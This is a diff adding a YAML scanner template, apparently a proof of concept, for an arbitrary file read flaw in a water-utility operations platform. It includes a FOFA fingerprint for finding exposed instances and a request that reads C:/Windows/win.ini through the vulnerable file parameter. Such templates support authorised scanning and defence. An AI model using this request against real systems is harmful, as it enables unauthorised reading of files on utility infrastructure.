@@ -1,0 +1,18 @@
+id: poc-yaml-sntsoft-wseiop-instance-anyfile-read
+info:
+  name: 森鑫炬水务企业综合运营平台 Instance 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 森鑫炬水务企业综合运营平台
+  fofa: body="重庆森鑫炬科技有限公司"
+requests:
+- method: GET
+  path: /Account/LogOn?ReturnUrl=%2f
+  expression: status_code == 200 && contains(body,"重庆森鑫炬科技有限公司")
+- method: GET
+  path: /Forms/Instance/Get?file=C:/Windows/win.ini
+  expression: status_code == 200 && contains(body,"[files]") && contains(body,"bit
+    app support") && !contains(body,"<") && contains(content_type,"text/xml")
+variables: {}
+transport: http
